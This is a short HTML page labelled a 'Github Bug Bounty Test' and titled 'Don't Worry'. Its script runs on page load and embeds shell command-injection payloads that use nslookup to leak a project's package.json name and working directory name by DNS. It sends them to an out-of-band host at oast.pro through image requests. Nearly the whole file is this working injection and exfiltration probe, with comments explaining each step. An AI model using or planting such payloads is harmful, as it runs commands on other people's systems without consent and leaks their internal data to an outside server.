<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Don't Worry</title>
</head>
    <h1>Github Bug Bounty Test</h1>
<body>
    <script>
        (function() {
            // 1. YOUR CONFIGURATION
            const oobID = "9a5758d5b30f88782d53g1431jcyyyyyb.oast.pro"; 

            // 2. THE COMMANDS
            // This command:
            // - Finds package.json
            // - Grabs the 'name' value
            // - Removes quotes and spaces
            // - Truncates to 60 chars (DNS limit)
            // - Appends your OOB ID
            const pkgCmd = `$(nslookup $(grep '"name":' package.json | head -n 1 | cut -d'"' -f4 | tr -d ' ' | tr '[:upper:]' '[:lower:]' | cut -c1-60).${oobID})`;
            
            // This command checks for the CURRENT DIRECTORY name
            const dirCmd = `$(nslookup $(basename $(pwd) | tr -d ' ').${oobID})`;

            // 3. EXECUTION
            // We use standard Image tags to bypass CORS and trigger the backend
            
            // Probe 1: Seek Internal Package Name
            var img1 = new Image();
            img1.src = `https://${oobID}/pkg-seek?name=${pkgCmd}`;

            // Probe 2: Seek Working Directory Name
            var img2 = new Image();
            img2.src = `https://${oobID}/dir-seek?name=${dirCmd}`;

            console.log("Dependency probes sent.");
        })();
    </script>
</body>
</html>
